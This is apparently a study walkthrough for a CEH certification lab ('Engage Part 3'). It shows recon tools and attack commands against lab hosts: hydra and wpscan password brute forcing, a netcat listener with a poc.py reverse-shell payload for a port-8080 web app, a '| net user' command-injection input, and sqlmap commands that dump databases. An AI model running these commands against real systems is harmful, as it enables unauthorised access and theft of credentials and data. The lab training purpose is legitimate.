# 3⃣ CEH Engage Part 3

You have been assigned a task to perform a clickjacking test on www.certifiedhacker.com that the CEHORG members widely use. Find out whether the site is vulnerable to clickjacking.

### GhostEye

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

### Nikto

<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>





Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Nginx used by the web server.



### BillCipher

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### Whatweb

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>



An FTP site is hosted on a machine in the CEHORG network. Crack the FTP credentials, obtain the “flag.txt” file and determine the content in the file.

```
nmap -p 21 172.16.0.0/24

nmap -p 21 10.10.10.0/24

nmap -p 21 192.168.0.0/24
```

```
hydra -L <username.txt> -P <password.txt> ftp://172.16.0.12
```

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>







Perform web application reconnaissance on movies.cehorg.com and find out the HTTP server used by the web application.

### Whatweb

```
whatweb movies.cehorg.com
```

<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

### Nmap

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>





Identify the load balancing service used by eccouncil.org.&#x20;

```
ldb eccouncil.org
```

\-> cloudflare

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>



Identify the Content Management System used by www.cehorg.com.

```
wig www.cehorg.com
```

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>



Perform a bruteforce attack on www.cehorg.com and find the password of user adam.

```
wpscan --url http://cehorg.com/wp-login.php -U <username.txt> -P <password.txt>
```

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

Perform parameter tampering on movies.cehorg.com and find out the user for id 1003.

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Type the username as "Jason" and password as "welcome"

\
We found this username and password in the engage part 2. While dumping the wireshark capture data. REMEMBER?
{% endhint %}

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>





You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer.

```
nmap -p 8080 172.16.0.0/24

nmap -p 8080 10.10.10.0/24

nmap -p 8080 192.168.0.0/24
```



#### Extract and Setup Jdk

```
tar -xf jdk-8u202-linux-x64.tar.gz

mv jdk1.8.0_202 /usr/bin
```

#### Update the JDK Path in the Poc.py file

{% hint style="info" %}
Change Line no: 62, replace jdk1.8.0\_20/bin/javac with "/usr/bin/jdk1.8.0\_202/bin/javac"

\
Change Line no: 87, replace jdk1.8.0\_20/bin/java with "/usr/bin/jdk1.8.0\_202/bin/java"\
\
Change Line no: 99, replace jdk1.8.0\_20/bin/java with "/usr/bin/jdk1.8.0\_202/bin/java"
{% endhint %}

#### Create a Netcat Listener

```
nc -lvp 9001
```

#### Create a Payload

```
python3 poc.py --userip 10.10.1.13 --webport 8080 --lport 9001
```



{% hint style="info" %}
Copy the send me payload and paste in the username field and enter any random password and press Login
{% endhint %}



<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>



Perform command injection attack on 10.10.10.25 and find out how many user accounts are registered with the machine. Note: Exclude admin/Guest user

```
| net user
```

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>













A file named Hash.txt has been uploaded through DVWA (http://10.10.10.25:8080/DVWA). The file is located in the directory mentioned below. Access the file and crack the MD5 hash to reveal the original message; enter the content after cracking the hash. You can log into the DVWA using the following credentials. Note: Username- admin; Password- password Path: C:\wamp64\www\DVWA\hackable\uploads\Hash.txt Hint: Use “type” command to view the file. Use the following link to decrypt the hash- https://hashes.com/en/decrypt/hash

{% embed url="https://hashes.com/en/decrypt/hash" %}

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>



Perform Banner grabbing on the web application movies.cehorg.com and find out the ETag of the respective target machine.

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>



Perform Web Crawling on the web application movies.cehorg.com and identify the number of live png files in images folder.

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>



Perform XSS vulnerability test on www.cehorg.com and identify whether the application is vulnerable to attack or not. (Yes/No).

\-> No

### PwnXSS

```
python3 pwnxss.py -u http://www.cehorg.com
```



### OWASP ZAP

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>



Perform a SQL Injection attack on movies.cehorg.com and find out the number of users available in the database. Use Jason/welcome as login credentials.

#### Get Database

```
sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" --dbs
```

#### Get Tables

```
sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope --tables
```

#### Get number of Users available

```
sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope -T UserProfile --count
```

#### Dump Table Data

```
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<Cookie Value>" -D moviescope -T User_Login --dump
```

#### Dump Databases

```
sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope --dump-all
```

<figure><img src="../../.gitbook/assets/Screenshot from 2023-11-25 15-57-59.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot from 2023-11-25 15-59-02.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot from 2023-11-25 15-58-22.png" alt=""><figcaption></figcaption></figure>







CEHORG suspects of a possible session hijacking attack on a machine in its network. The organisation has retained the network traffic data for the session at C:\Users\Admin\Documents in the EH Workstation – 2 as sniffsession.pcap. You have been assigned a task to perform an analysis and find out the protocol that has been used for sniffing on its network.





<figure><img src="../../.gitbook/assets/Screenshot from 2023-11-25 16-02-44.png" alt=""><figcaption></figcaption></figure>
